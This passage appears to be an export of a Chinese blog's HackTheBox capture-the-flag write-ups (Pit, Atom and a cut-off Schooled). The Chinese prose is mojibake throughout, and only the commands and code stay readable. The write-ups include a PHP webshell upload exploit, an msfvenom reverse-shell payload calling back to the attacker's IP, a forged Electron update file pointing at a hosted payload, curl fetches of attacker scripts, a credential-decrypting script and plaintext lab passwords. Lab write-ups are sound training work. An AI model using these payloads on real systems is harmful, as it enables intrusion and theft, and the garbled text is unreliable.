é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sC -sV 10.10.10.241 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥é¶åœºå¼€å¯äº†22ã€80ã€9090ç«¯å£ å¹¶ä¸”æœ‰ä¸€ä¸ªä¸€ä¸ªåŸŸådms-pit.htbï¼Œå’±ä»¬å°†å®ƒåŠ å…¥hostsé‡Œ vim &#x2F;etc&#x2F;hosts é¦–å…ˆæˆ‘ä»¬è®¿é—®ä¸€ä¸‹pit.htbçœ‹çœ‹ å°±æ˜¯ä¸€ä¸ªNginxçš„åˆå§‹é¡µé¢ï¼Œæ²¡ä»€ä¹ˆçœ‹çš„æ„ä¹‰ æ¥ç€å’±ä»¬çœ‹çœ‹dms-pit.htb å•Šè¿™ï¼Œç›´æ¥403ï¼Œä¹Ÿä¸ç”¨çœ‹ï¼Œé‚£å’±ä»¬å»çœ‹çœ‹9090ç«¯å£å§ å¥½åƒæ˜¯ä¸€ä¸ªCentOSçš„åœ¨çº¿ç®¡ç†é¡µé¢ï¼Œä½†æ˜¯å’±ä»¬ä¹Ÿæ²¡å¯†ç å•Š ç»è¿‡å¤§é‡çš„ç›®å½•æœé›†ä»¥åï¼Œæˆ‘å‘ç°è¿˜æ˜¯æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ²¡åŠæ³•äº†å‘€ï¼Œåªèƒ½å»å®˜æ–¹è®ºå›çœ‹çœ‹å¤§ä½¬ä»¬çš„æç¤ºäº† å¤§ä½¬è¯´åœ¨å®˜æ–¹æ¨ç‰¹ä¼šæœ‰ä¸€ä¸ªå¾ˆå¥½çš„æç¤ºï¼Œé‚£å’±ä»¬å»æ‰¾æ‰¾çœ‹å§ å®˜æ–¹æç¤ºåœ¨WALK æ‰€ä»¥å’±ä»¬æ‰«æä¸€ä¸‹è¿™å°æœºå™¨çš„snmpå¼€æ”¾ç«¯å£å§ nmap -sU 10.10.10.241 æˆ‘ä»¬å‘ç°äº†ä»–çš„SNMPç‰ˆæœ¬ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ¥è¿›è¡Œæ‰«æ https://github.com/dheiland-r7/snmp è¿™é‡Œæˆ‘ä»¬æˆåŠŸè·å¾—äº†å†…æ ¸ç‰ˆæœ¬ã€ç›®å½•ã€ç”¨æˆ·å ç›®å‰ä¿¡æ¯è·å–æœé›†åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è¿˜æ˜¯æ²¡æœ‰è¿›ä¸€æ­¥çš„åŠæ³•ï¼Œå’‹åŠå‘¢ åœ¨æˆ‘ç¿»æ‰¾10.10.10.241.snmpæ–‡ä»¶çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€è¡Œ è¿™æ˜¾ç„¶æ˜¯ä¸€ä¸ªç›®å½•å•Šï¼Œæ ¹æ®ç›®å½•æ¥æ„é€ ï¼ŒURLåº”è¯¥ä¸ºhttp://localhost/seeddms51x/seeddms/ï¼Œè®©å’±ä»¬å»å°è¯•ä¸€ä¸‹ ç¡®è®¤äº†URLä¸ºhttp://dms-pit.htb/seeddms51x/seeddms/ ç„¶åéœ€è¦è´¦å·å¯†ç ï¼Œé‚£è¿˜å¾—å»æ‰¾æ‰¾snmpæ–‡ä»¶ å‘ç°äº†ä¸¤ä¸ªè´¦æˆ· rootå’Œmichelleï¼Œå’±ä»¬å»å°è¯•ä¸€ä¸‹ æµ‹è¯•åå‘ç°è´¦å·å¯†ç ä¸ºmichelleï¼Œæ—¢æ˜¯è´¦å·ï¼Œä¹Ÿæ˜¯å¯†ç  æ¼æ´åˆ©ç”¨ è¿™é‡Œå’±ä»¬å¯ä»¥çœ‹åˆ°æ‰€ä½¿ç”¨çš„æ˜¯SeedDMSï¼Œç„¶åå»æœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´ å…¶ä¸­ç¬¬å››ä¸ªæ˜¯æˆ‘ä»¬è¦çš„æ¼æ´ï¼Œå’±ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹ cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;47022.txt CVE-2019-12744 è¿™ä¸ªæ¼æ´çš„æ„æ€å‘¢æ˜¯ ç™»å½•åº”ç”¨ç¨‹åºå¹¶åœ¨ä»»ä½•æ–‡ä»¶å¤¹ä¸‹æ·»åŠ æ–‡æ¡£ é€‰æ‹©æ–‡ä»¶ä½œä¸ºç®€å•çš„phpåé—¨æ–‡ä»¶æˆ–ä»»ä½•åé—¨webshelléƒ½å¯ä»¥ä½¿ç”¨ ä¸Šä¼ åæ£€æŸ¥ä¸æ–‡æ¡£å¯¹åº”çš„æ–‡æ¡£ID è®¿é—®example.com&#x2F;data&#x2F;1048576&#x2F;â€œdocument_idâ€&#x2F;1.php?cmd&#x3D;cat+&#x2F;etc&#x2F;passwdä»¥åœ¨æµè§ˆå™¨ä¸­åˆ©ç”¨ ç¬¬ä¸€æ­¥ï¼Œåœ¨æœ¬åœ°ä»»æ„åˆ›å»ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ â€œ; $cmd &#x3D; ($_REQUEST[â€˜cmdâ€™]); system($cmd); echo â€œâ€; die; } ?&gt; ç¬¬äºŒæ­¥ï¼Œç™»å½•åå°åï¼Œä¾æ¬¡ç‚¹å‡» Docs -&gt; Users -&gt; Michelle -&gt; Add document ç¬¬ä¸‰æ­¥ï¼Œä¸Šä¼ phpé©¬ ç¬¬å››æ­¥ï¼Œå¤åˆ¶phpé©¬çš„è¿æ¥ http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1 ä»ä¸Šæˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ–‡æ¡£IDä¸º44ï¼Œç„¶åæˆ‘ä»¬æ„é€ poc http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ è¯¥shellä¼šäº”åˆ†é’Ÿåˆ é™¤ä¸€æ¬¡ï¼Œå¦‚æœè¢«åˆ é™¤äº†å¤§å®¶é‡æ–°ä¸Šä¼ ä¸€æ¬¡å³å¯ å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹conf&#x2F;settings.xmlæ–‡ä»¶ http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml æ‰“å¼€åä¼šå‘ç°è¿™æ˜¯ä¸€ä¸ªç©ºç™½é¡µé¢ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹æºæ–‡ä»¶ æˆåŠŸæ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç  seeddms ied^ieY6xoquu å’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ•°æ®åº“è´¦å·å¯†ç å¹¶æ²¡æœ‰åœ¨ç³»ç»Ÿè´¦æˆ·é‡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•ç›´æ¥åˆ©ç”¨sshè¿›è¡Œç™»å½•ï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿçªç„¶æƒ³åˆ°ï¼Œå’±ä»¬9090ç«¯å£ä¸æ˜¯éœ€è¦ä¸€ä¸ªè´¦å·å¯†ç å˜›ï¼Œå’±ä»¬å»è¯•è¯• ç»è¿‡æµ‹è¯•ï¼Œè´¦å·æ˜¯michelleï¼Œå¯†ç æ˜¯ied^ieY6xoquu OKï¼Œå’±ä»¬æˆåŠŸç™»å½• çªç„¶ï¼Œæˆ‘çš„çœ¼å…‰å°±è¢«â€œç»ˆç«¯â€ä¸¤ä¸ªå­—å¸å¼•äº† å’±ä»¬è¿™å°±ç›´æ¥ä»nginxæƒé™ï¼Œæ‹¿åˆ°äº†ä¸€ä¸ªusersçš„æƒé™ æˆåŠŸè·å¾—useræƒé™çš„flag æƒé™æå‡ å’±ä»¬ç»§ç»­æŠŠç›®å…‰æ”¾åœ¨snmpæ–‡ä»¶ä¸Š åœ¨ç»è¿‡ç¡®è®¤åï¼Œæˆ‘æŠŠçœ¼å…‰æ”¾åœ¨äº†è¿™ä¸€è¡Œä¸Šï¼Œå’±ä»¬å»çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶ è¿™æ˜¯ä¸€ä¸ªbashè„šæœ¬ï¼Œæ„Ÿè§‰å¯èƒ½æœ‰ç”¨ï¼Œå…ˆè®°å½•ä¸Š ä¸Šé¢çš„è„šæœ¬æ˜¾ç¤ºäº†ä»å¦ä¸€ä¸ªä½ç½®è¿è¡Œäº†è„šæœ¬ï¼Œå’±ä»¬ä¸€æ­¥æ­¥è·Ÿè¿‡å»çœ‹çœ‹ ls -la &#x2F;usr&#x2F;local&#x2F;monitoring&#x2F; æ— æ³•åˆ—å‡ºï¼Œåº”è¯¥æ˜¯æƒé™ä¸è¶³ï¼Œå’±ä»¬çœ‹çœ‹è¯¥ç›®å½•çš„æƒé™ å’±ä»¬å¯¹è¿™ä¸ªç›®å½•æœ‰è¯»ã€å†™ã€æ‰§è¡Œä»¥åŠ+æƒé™ ä¹Ÿå°±æ˜¯æœ‰æƒé™æ‰©å±•ï¼Œè®©å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹ ä»ä¸Šé¢å¯ä»¥è§£è¯»å‡ºï¼Œè¯¥ç›®å½•å±äºrootç”¨æˆ·ï¼Œå…¶ä»–ç”¨æˆ·æœ‰æ‰€æœ‰æƒé™ï¼Œä½†michelleç”¨æˆ·åªæœ‰å†™å…¥å’Œæ‰§è¡Œæƒé™ è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ¥æ‰¾å‡ºæƒ³è¦çš„ä¸œè¥¿ æˆåŠŸäº† åˆ›å»ºä¸€ä¸ªshæ–‡ä»¶ï¼Œå¡«å…¥å…¬é’¥ï¼Œç„¶åä¸Šä¼ åˆ°æœåŠ¡å™¨ æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨ python3 -m http.server 80 åœ¨ç»ˆç«¯ä¸­ä½¿ç”¨curlè¿›è¡Œä¸‹è½½ curl http://10.10.14.236/check.sh -o check.sh ç„¶åæ‹·è´åˆ°&#x2F;usr&#x2F;local&#x2F;monitoring&#x2F;ç›®å½•ä¸‹ cp check.sh &#x2F;usr&#x2F;local&#x2F;monitoring&#x2F; rootè´¦æˆ·æ­£è¿è¡Œç€ä¸€ä¸ªè„šæœ¬ï¼Œç›‘æ§ç›®å½•çš„å†…å®¹ç„¶ååœ¨äº”åˆ†é’Ÿååˆ é™¤ æŠŠæˆ‘ä»¬çš„shellæ”¾è¿›å»åï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœ¬åœ°è¿è¡ŒSNMPwalkåº”ç”¨ç¨‹åºæ‰§è¡Œå®ƒ snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects ç„¶åå’±ä»¬ä½¿ç”¨sshè¿›è¡Œè¿æ¥ ssh -i lucifiel root@10.10.10.241 å¦‚æœè¿™é‡Œæç¤º&#114;&#x6f;&#111;&#116;&#64;&#x31;&#x30;&#46;&#49;&#48;&#46;&#x31;&#48;&#x2e;&#50;&#52;&#x31;: Permission denied (publickey,gssapi-keyex,gssapi-with-mic). åˆ™æ˜¯snmpwalkçš„é—®é¢˜ï¼Œè¾“å…¥sudo apt-get install snmp-mibs-downloaderè¿›è¡Œé‡æ–°å®‰è£…å³å¯ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Atom - Hackthebox","slug":"Hackthebox - Atom","date":"2021-06-05T11:38:36.000Z","updated":"2023-05-20T01:16:09.000Z","comments":true,"path":"2021/06/05/Hackthebox - Atom/","link":"","permalink":"http://www.lucifiel.com/2021/06/05/Hackthebox%20-%20Atom/","excerpt":"","text":"Hackthebox - Atomé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapé¦–å…ˆä½¿ç”¨NMAPè¿›è¡Œç«¯å£æ‰«æ Smbæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°é¶åœºå¼€å¯äº†80 135 443 445ç«¯å£ï¼Œä»¥åŠæœ‰SMBæœåŠ¡ ä¸”SMBæœåŠ¡å¯ä»¥ç”±guestæƒé™ç™»å½•ï¼Œé‚£å’±ä»¬å°±å…ˆçœ‹çœ‹smbæœ‰å•¥å§ smbclient -L ////10.10.10.237//// å¯†ç ä¸ºç©ºå³å¯ çœ‹çœ‹æˆ‘ä»¬å¯ä»¥åŒ¿åé˜…è¯»çš„å†…å®¹æœ‰å“ªäº› smbmap -u &#39;anonymous&#39; -p &#39;&#39; -H 10.10.10.237 çœ‹æ¥å¯ä»¥åŒ¿åè¯»å†™Software_Updatesç›®å½• smbclient [\\\\\\\\10.10.10.237\\\\Software_Updates](file:///////10.10.10.237//Software_Updates) ç™»å½• ç„¶åä½¿ç”¨diræŸ¥çœ‹ çœ‹æ¥UAT_Testing_Procedures.pdfæ–‡æ¡£å¯ä»¥è¢«ä¸‹è½½ï¼Œå’±ä»¬ä½¿ç”¨getè¿›è¡Œä¸‹è½½ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ–‡æ¡£æè¿°äº†ä¸€ä¸ªåä¸ºHeedçš„ç¬”è®°åº”ç”¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäºå®¢æˆ·ç«¯çš„åº”ç”¨ç¨‹åºï¼Œæ²¡æœ‰ä¸æœåŠ¡å™¨äº¤äº’ã€‚ä½†æ˜¯å®ƒç¡®å®é€šè¿‡å®¢æˆ·ç«¯æ–‡ä»¶å¤¹è¿›è¡Œäº†æ›´æ–°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å·²ç»æœ‰ä¸‰ä¸ªæ–‡ä»¶å¤¹äº†ï¼Œåˆ†åˆ«æ˜¯client1ã€client2ã€client3ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥è®¿é—®80ç«¯å£ æˆ‘ä»¬å¾€ä¸‹ç¿»æ»šï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸‹è½½æŒ‰é’®å’Œä¸€ä¸ªé‚®ç®±&#x4d;&#114;&#x52;&#x33;&#x62;&#x6f;&#x6f;&#116;&#x40;&#97;&#x74;&#111;&#109;&#x2e;&#x68;&#116;&#98; æ—¢ç„¶åŸŸåéƒ½ç»™äº†ï¼Œé‚£è¿˜æ˜¯è€è§„çŸ©ï¼Œæ·»åŠ hostså§ vim /etc/hosts Gobusteræ—¢ç„¶éƒ½æ·»åŠ äº†ï¼Œé‚£ç›®å½•çˆ†ç ´å’Œå­åŸŸåçˆ†ç ´å°±ä¸èƒ½å°‘äº†ï¼Œçˆ†ç ´å§ gobusterçˆ†ç ´ç›®å½• gobuster dir -u &quot;http://10.10.10.237/&quot; -x php,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt gobusterçˆ†ç ´DNS gobuster dns -d &#39;atom.htb&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt ç®€å•çˆ†ç ´äº†ä¸€ä¸‹ï¼Œå¥½åƒéƒ½æ²¡å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œé‚£å’±ä»¬åªèƒ½å»ä¸‹è½½äº† ä¸‹è½½ä¸‹æ¥åæ˜¯ä¸€ä¸ªexeç¨‹åºï¼Œè¿™å°±ä¸å¾—ä¸åˆ‡æ¢ä¸€å°windowsçš„æœºå™¨å‡ºæ¥äº† å®‰è£…å¥½åæ˜¯é…±å©¶å„¿çš„ è¿™å‘Šè¯‰æˆ‘ä»¬è¿™æ˜¯ä¸€ä¸ªç”µå­åº”ç”¨ç¨‹åº é€šè¿‡Googlesæœç´¢rceç¨‹åº https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html Juliano Rizzo è¿™é‡Œæåˆ°äº†æ˜¯ç”±è¿™ä½å¤§ä½¬å‘ç°çš„æ¼æ´ï¼Œæ„Ÿè°¢ è¿™é‡Œè¯´å®ƒå°†ä»latest.ymlè¿›è¡Œæ›´æ–° æ¼æ´åˆ©ç”¨é¦–å…ˆæˆ‘ä»¬ç”Ÿæˆå¸¦æœ‰å•å¼•å·çš„æœ‰æ•ˆè´Ÿè½½ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.184 LPORT=4444 -f exe &gt; &quot;u&#39;payload.exe&quot; ç°åœ¨æˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ª sha512 sum hash å¹¶å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶åè¿›ä¸€æ­¥è½¬æ¢ä¸ºbase64 shasum -a 512 &quot;u&#39;payload.exe&quot; | cut -d &quot; &quot; -f1 | xxd -r -p | base64 kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg== åˆ›å»ºlatest.ymlæ–‡ä»¶ version: 1.0.1 path: http://10.10.14.184/u&#39;payload.exe sha512: kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg== ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨ python3 -m http.server 80 æ›¿æ¢æ‰smbå…±äº«ä¸­çš„ymlæ–‡ä»¶ ä¸‰ä¸ªæ–‡ä»¶å¤¹éƒ½è¦æ›¿æ¢ use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp ä½¿ç”¨msfconsoleå¼€å¯ç›‘å¬ é…ç½®å¥½é…ç½®é¡¹åexploitæ‰§è¡Œ æˆ‘ä»¬å¯ä»¥çœ‹åˆ° httpæœåŠ¡å™¨é‡Œå·²ç»æ”¶åˆ°äº†GETè¯·æ±‚ ç„¶åæˆ‘ä»¬å†å»çœ‹çœ‹MSF å·²ç»æˆåŠŸgetshelläº† å¦‚æœæ²¡æœ‰å¼¹å›shellï¼Œå°±å¤šå°è¯•å‡ æ¬¡ï¼Œæˆ–ä½¿ç”¨1.2.3ç‰ˆæœ¬å· æƒé™æå‡ ä¸ºäº†ææƒï¼Œæˆ‘å…ˆè¾“å…¥äº†getprivsæŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™ è¾“å…¥shellè¿›å…¥shellæ§åˆ¶ é¦–å…ˆè¿›å…¥Program Filesç›®å½• ç„¶åè¿›å…¥Redisç›®å½• ç„¶åæˆ‘ä»¬çœ‹åˆ°redisçš„é…ç½®æ–‡ä»¶ redis.windows-service.conf æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé‡Œé¢æœ‰redis cliçš„å¯†ç kidvscat_yes_kidvscat ç„¶åå’±ä»¬å‘ç°è¿™å°é¶æœºçš„6379ç«¯å£ ä¹Ÿå°±æ˜¯redisæœåŠ¡å¼€ç€å‘¢ï¼Œé‚£å°±ç›´æ¥ç™»å½•å§ ç™»å½•æˆåŠŸï¼Œå¹¶ä½¿ç”¨infoè¿›è¡Œä¿¡æ¯æŸ¥çœ‹ ä½¿ç”¨keys *åˆ—å‡ºæ‰€æœ‰hash e8e29158-d70d-44b1-a1ba-4949d52790a0 æŸ¥çœ‹userç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªç®¡ç†å‘˜çš„hash Odh7N3L9aVQ8&#x2F;srdZgG2hIR0SSJoJKGi åŒæ—¶æˆ‘ä»¬åœ¨ç”¨æˆ·jasonçš„æ¡Œé¢å‘ç°äº†ä¸€ä¸ªuser.txt æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag åœ¨æ£€æŸ¥å…¶ä»–æ–‡ä»¶çš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå’±ä»¬è¿›å»çœ‹çœ‹ è¿™é‡Œä¼¼ä¹æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå’±ä»¬çœ‹çœ‹å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ è¿™ä¸ªç¨‹åºå¼•èµ·äº†æˆ‘çš„å…´è¶£ï¼Œç„¶åå»Googleäº†ä¸€ä¸‹ https://www.exploit-db.com/exploits/49409 ç„¶åæ‰¾åˆ°äº†ä¸€ä¸ªexp å¯èƒ½ã€‚ã€‚ã€‚è¿™å°±æ˜¯ç¼˜åˆ†å§ï¼Ÿ å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹é…ç½®æ–‡ä»¶Portablekanban.cfg è·å¾—äº†portablekanbançš„hashå€¼ Odh7N3L9aVSeHQmgK&#x2F;nj7RQL8MEYCUMb è¿™æ—¶å€™å¼€åŠ¨æˆ‘ä»¬æœºçµçš„å°è„‘ç“œï¼ŒåŠ¨èµ·æˆ‘ä»¬å‹¤åŠ³çš„å°æ‰‹ï¼Œå°å°çš„ä¿®æ”¹ä¸€ä¸‹exp import json import base64 from des import * #python3 -m pip install des import sys def decode(hash): hash = base64.b64decode(hash.encode(&#39;utf-8&#39;)) key = DesKey(b&quot;7ly6UznJ&quot;) return key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode(&#39;utf-8&#39;) print(decode(&#39;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#39;)) æ‰§è¡Œä¸€ä¸‹è¿™ä¸ªè„šæœ¬ æˆåŠŸå¾—åˆ°Administratorçš„å¯†ç kidvscat_admin_@123 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°5985ç«¯å£æ˜¯å¼€å¯çš„ åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“ï¼Œå› ä¸ºæ€è·¯å¡å£³çš„æˆ‘ï¼Œæƒ³äº†ä¸€æ™šä¸Š NBå—ï¼Ÿç”¨å¤´å‘æ¢çš„ ç»è¿‡Googleï¼Œæˆ‘ä»¬å‘ç°5985ç«¯å£æ˜¯WinRMç¨‹åºä½¿ç”¨çš„ç«¯å£ é‚£å’±ä»¬å°±æ ¹æ®æ–‡æ¡£æ¥åˆ©ç”¨å§ æ³¨æ„ï¼Œåœ¨kaliä¸­å®‰è£…winrmçš„æŒ‡ä»¤æ˜¯ gem install evil-winrm å®‰è£…å¥½åä½¿ç”¨evil-winrmè¿›è¡Œç™»å½• evil-winrm -i 10.10.10.237 -u &#39;administrator&#39; -p &#39;kidvscat_admin_@123&#39; æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag æ”¶å·¥ç¡è§‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Schooled - Hackthebox","slug":"Hackthebox - Schooled","date":"2021-06-04T11:38:36.000Z","updated":"2023-05-20T02:58:19.000Z","comments":true,"path":"2021/06/04/Hackthebox - Schooled/","link":"","permalink":"http://www.lucifiel.com/2021/06/04/Hackthebox%20-%20Schooled/","excerpt":"","text":"Hackthebox - SchooledHackthebox - Schooled é¶åœºå®æˆ˜ é¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ nmap -A -sS -sC -sV 10.10.10.234 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°é¶æœºå¼€å¯äº†22å’Œ80ç«¯å£ï¼Œå’±ä»¬çš„ç›®å…‰ä¾ç„¶æ”¾åˆ°80ç«¯å£ä¸Š é¦–å…ˆè®¿é—®ä¸€ä¸‹80ç«¯å£çš„httpæœåŠ¡ åœ¨åº•éƒ¨çœ‹åˆ°ä¸€ä¸ªschooled.htbï¼Œé‚£ä¼°è®¡æ˜¯è¦è§£æäº†ï¼Œå’±ä»¬ç›´æ¥å…ˆåŠ ä¸Šå§ åœ¨æ‰‹åŠ¨æµè§ˆä»¥åŠdirbç›®å½•çˆ†ç ´çš„æ—¶å€™ï¼Œéƒ½æ²¡æœ‰åœ¨webé¡µé¢ä¸­æ‰¾åˆ°å•¥æœ‰è¶£çš„ä¸œè¥¿ å’±ä»¬ç»“åˆä¸€ä¸‹ä¸Šé¢çœ‹åˆ°çš„æç¤ºæœ‰ä¸€ä¸ªschooled.htbåŸŸåä»¥åï¼Œçªç„¶æ¥äº†æ€è·¯ è¿™ä¸å°±è·Ÿå’±ä»¬åšçš„Loveé‚£ä¸€å°å·®ä¸å¤šå—ï¼Ÿéƒ½æ˜¯å¾—ä»å­åŸŸåå…¥æ‰‹ æ‰€ä»¥è¿™ä¸ªæ—¶å€™ä½¿ç”¨wfuzzå·¥å…·è¿›è¡Œfuzz å’±ä»¬è¿™é‡Œå‘ç°æœ‰å¾ˆå¤š461è¡Œçš„ç›¸åº”ï¼Œè¿™æ˜æ˜¾æ˜¯ä¸å¯¹çš„ï¼Œå’±ä»¬æŠŠ461è¡Œçš„ç›¸åº”å±è”½æ‰ wfuzz -c -u â€œhttp://schooled.htb/&quot; -H â€œHost:FUZZ.schooled.htbâ€ -w &#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-5000.txt â€“hl 461 å’±ä»¬æ‰¾åˆ°ä¸€ä¸ªmoodleå­åŸŸå å’±ä»¬å…ˆä¿®æ”¹ä¸€ä¸‹hostsè§£æ å»è®¿é—®ä¸€ä¸‹http://moodle.schooled.htb/ åœ¨è¿™é‡Œå’±ä»¬æ‰¾åˆ°äº†å‡ ä¸ªè€å¸ˆçš„åå­— æ•°å­¦è€å¸ˆï¼šJamie Borham ç§‘å­¦è€å¸ˆï¼šLianne Carter ä¿¡æ¯æŠ€æœ¯ï¼šJane Higgins è‹±è¯­è€å¸ˆï¼šManuel Phillips ç„¶åé™¤äº†è€å¸ˆçš„åå­—å’Œæ‰¾åˆ°äº†ç™»é™†ç‚¹ä»¥å¤–ï¼Œå°±æ²¡ä»€ä¹ˆæœ‰æ„æ€çš„ä¸œè¥¿äº† å’±ä»¬é¦–å…ˆåˆ›å»ºä¸ªè´¦å·ï¼Œé”™è¯¯æœ‰ç‚¹å¤šï¼Œå’±ä»¬æŒ¨ä¸ªè§£å†³ å¯ç®—æ˜¯æ³¨å†Œå¥½äº†ï¼Œè¿˜æŒºéº»çƒ¦ éšä¾¿æµè§ˆäº†ä¸€ä¸‹ï¼Œå‘ç°æˆ‘ä»¬åªèƒ½æŠ¥æ•°å­¦è¯¾ï¼ˆåæ§½ä¸€ä¸‹åƒåœ¾æŠ¢è¯¾ç³»ç»Ÿï¼Œè¿˜å¥½æˆ‘ä¸ç”¨ï¼‰ æˆ‘ä»¬è¿˜èƒ½çœ‹åˆ°è€å¸ˆçš„ç®€ä»‹ æˆ‘ä»¬å‘ç°è€å¸ˆæœ‰å‘å¸ƒä¸€æ¡å¸–å­ï¼Œæˆ‘ç”¨æˆ‘çš„å°å­¦ä¸‰å¹´çº§é ä¸ªä½æ•°çš„å¤©æ‰è‹±è¯­ç»™å¤§å®¶ç¿»è¯‘ä¸€ä¸‹ å¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œè¿™æ˜¯ä¸€é—¨è‡ªå­¦è¯¾ç¨‹ï¼ˆè¦è€å¸ˆå¹²å•¥ï¼Ÿï¼‰ï¼Œå‚åŠ æˆ‘ï¼ˆè¿™ä½è€å¸ˆï¼‰è¯¾ç¨‹çš„å­¦ç”Ÿï¼Œç¡®ä¿è®¾ç½®å¥½äº†MoodleNetä¸ªäººèµ„æ–™ã€‚æ²¡è®¾ç½®çš„å¼€å§‹è¯¾ç¨‹ä»¥åï¼Œä¼šè¢«è¸¢å‡ºè¿™é—¨è¯¾ç¨‹ï¼Œè€å¸ˆä¼šæŒ¨ä¸ªå„¿æŸ¥çœ‹æŠ¥åè¯¥è¯¾ç¨‹çš„å­¦ç”Ÿ å„ä½åœ¨åº§çš„ç›²ç”Ÿï¼Œå‘ç°äº†åç‚¹æ²¡æœ‰ï¼Ÿ Niceï¼Œçªç ´ç‚¹å°±åœ¨è€å¸ˆè¡¨ç¤ºä¼šæŒ¨ä¸ªæ£€æŸ¥æˆ‘ä»¬çš„èµ„æ–™ï¼Œè¿™ä¸å°±æ˜¯ç¡®å®š100%ä¼šç‚¹å‡»æˆ‘ä»¬çš„èµ„æ–™äº†å—ï¼Ÿé‚£æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿæ²¡é”™ï¼XSSï¼ å’±ä»¬ä¿®æ”¹å¥½ä»¥åï¼Œå¯ä»¥çœ‹åˆ°è€å¸ˆä¸Šçº¿äº† å“å˜¿ï¼Œç»è¿‡æµ‹è¯•ï¼ŒèŠå¤©æ¡†æ˜¯å¯ä»¥ç”¨xssçš„ 